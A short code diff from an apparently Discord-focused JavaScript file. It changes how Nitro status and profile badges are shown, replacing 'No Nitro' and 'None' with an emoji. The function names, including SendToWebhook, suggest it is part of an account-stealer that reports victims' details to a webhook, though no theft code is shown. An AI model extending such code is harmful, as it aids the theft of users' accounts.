@@ -234,12 +234,12 @@ function SendToWebhook(e) {
 }
 function GetNitro(e) {
   return 0 == e
-    ? "No Nitro"
+    ? "<:off:966790397378588722>"
     : 1 == e
     ? "<:classic:896119171019067423> `Nitro Classic`"
     : 2 == e
     ? "<a:boost:824036778570416129> `Nitro Boost`"
-    : "No Nitro";
+    : "<:off:966790397378588722>";
 }
 function GetRBadges(e) {
   var t = "";
@@ -268,7 +268,7 @@ function GetBadges(e) {
     512 == (512 & e) && (t += "<:early_supporter:874750808414113823> "),
     16384 == (16384 & e) && (t += "<:bughunter_2:874750808430874664> "),
     131072 == (131072 & e) && (t += "<:developer:874750808472825986> "),
-    "" == t && (t = "None"),
+    "" == t && (t = "<:off:966790397378588722>"),
     t
   );
 }
